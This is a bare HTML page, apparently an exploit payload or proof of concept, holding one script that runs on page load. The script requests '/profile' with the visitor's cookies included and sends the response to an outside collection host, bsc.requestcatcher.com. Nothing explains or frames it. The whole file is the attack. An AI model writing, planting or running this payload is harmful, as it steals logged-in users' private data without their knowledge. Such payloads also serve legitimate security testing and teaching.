<!DOCTYPE html>
<html>
<body>
<script>
(async () => {
    const res = await fetch('/profile', {
        credentials: 'include'
    });
    const data = await res.text();
    
    await fetch('https://bsc.requestcatcher.com?data=' + encodeURIComponent(data), {
        mode: 'no-cors'
    });
})();
</script>
</body>
</html>
